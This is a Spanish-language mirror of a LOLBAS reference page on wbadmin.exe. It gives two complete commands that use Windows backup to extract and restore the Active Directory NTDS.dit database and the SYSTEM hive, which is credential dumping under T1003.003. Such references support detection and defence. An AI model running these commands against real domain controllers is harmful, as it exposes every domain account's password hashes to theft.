# LOLBAS: wbadmin.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Dump`

Windows Backup Administration utility

## Comandos

### Snapshoting of Active Directory NTDS.dit database

Dump · priv: Administrator, Backup Operators, SeBackupPrivilege · T1003.003

```cmd
wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
```

Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)

### Dumping of Active Directory NTDS.dit database

Dump · priv: Administrator, Backup Operators, SeBackupPrivilege · T1003.003

```cmd
wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
```

Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.

